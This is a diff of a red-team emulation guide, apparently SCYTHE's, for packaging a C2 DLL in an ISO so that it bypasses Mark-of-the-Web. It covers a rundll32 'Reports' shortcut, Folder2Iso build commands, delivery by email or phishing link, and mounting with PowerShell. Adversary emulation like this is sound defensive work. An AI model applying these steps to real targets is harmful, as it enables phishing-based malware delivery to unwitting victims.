@@ -10,10 +10,11 @@ Adversaries may abuse specific file formats, such as ISO, to evade Mark-of-the-W
 
 The below procedure uses the Folder2Iso project to build an ISO that can be mounted on a Windows system. If the ISO was downloaded from the Internet, it will bypass the Mark of the Web warning. Opening the Reports shortcut will execute the SCYTHE DLL payload.
 
-1. Create a new SCYTHE campaign, download a 32-bit or 64-bit DLL with Entry-point function name of "`PlatformClientMain`".
-2. Download the contents of the src directory to a working directory on your Windows system
-3. Rename the DLL to DOCUMENTS.dll and put it in the /ISO/Folder2Iso of the working directory.
-4. Open a Windows command prompt and cd to the working directory.
-5. Run `Folder2Iso.exe "Folder2Iso" "%USERPROFILE%\Downloads\NOBELIUM.iso" "NOBELIUM" 0 0 0 "None"`. This will take all the content of the Folder2Iso folder and create an ISO of it.
-6. Send the ISO file, host it on a web server, double click it, or `powershell Mount-DiskImage -ImagePath "%USERPROFILE%\Downloads\NOBELIUM.iso"` to mount.
-7. Double clicking the Reports shortcut will launch the DOCUMENTS.dll SCYTHE Campaign.
+1. Set up Command and Control (C2) using HTTPS and TCP 443 and generate DLL payload. If you are a SCYTHE user, create a new SCYTHE campaign, download a 32-bit or 64-bit DLL with the entry-point function name of `PlatformClientMain` 
+2. Copy the src folder from our GitHub to a working directory on your Windows system. Note we are using the Folder2Iso project to create the ISO.
+3. Copy and rename the SCYTHE DLL to `DOCUMENTS.dll` and put it in the Folder2Iso of the working directory
+4. In the Folder2Iso directory, create a shortcut called Reports and set the Target to: `C:\Windows\System32\rundll32.exe "DOCUMENTS.DLL",PlatformClientMain`
+5. Open a Windows command prompt and cd to the working directory.
+6. Run `Folder2Iso.exe "Folder2Iso" "%USERPROFILE%\Downloads\T1553.005.iso" "DECLASS" 0 0 0 "None"` This will take all the content of the Folder2Iso folder and create an ISO of it.
+7. Email the ISO file, host it on a web server and send a phishing link, double click it on your host, and/or execute from command line with `powershell Mount-DiskImage -ImagePath "%USERPROFILE%\Downloads\T1553.005.iso"` 
+8. In the newly mounted drive, double clicking the Reports shortcut which will launch the DOCUMENTS.dll SCYTHE Campaign.
